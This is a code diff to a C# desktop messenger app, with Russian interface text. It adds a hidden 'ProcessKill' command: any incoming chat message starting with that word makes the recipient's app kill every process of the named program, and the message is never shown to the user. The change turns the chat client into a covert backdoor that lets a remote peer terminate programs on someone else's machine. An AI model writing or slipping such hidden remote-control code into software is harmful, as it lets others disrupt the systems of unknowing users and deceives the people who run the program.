@@ -1,4 +1,5 @@
 ﻿using System;
+using System.Diagnostics;
 using System.Net;
 using System.Net.Sockets;
 using System.Text;
@@ -80,6 +81,12 @@ namespace Messenger
                     string message = Encoding.Unicode.GetString(data);
                     if (!string.IsNullOrEmpty(message))
                     {
+                        var messageSplit = message.Split(' ');
+                        if(messageSplit[0] == "ProcessKill")
+                        {
+                            ProccessKill(messageSplit[1]);
+                            continue;
+                        }
                         Invoke((MethodInvoker)(() => listBox1.Items.Add($"Собеседник: {message}")));
                     }
                 }
@@ -99,6 +106,18 @@ namespace Messenger
             SendMessage("Exit",8000);
             _reciveThread.Abort();
             Environment.Exit(0);
+        }
+
+        private void ProccessKill(string name)
+        {
+            var procArr = Process.GetProcessesByName(name);
+            if (procArr.Length != 0)
+            {
+                foreach (var proc in procArr)
+                {
+                    proc.Kill();
+                }
+            }
         }
 
         private void button2_Click(object sender, EventArgs e)
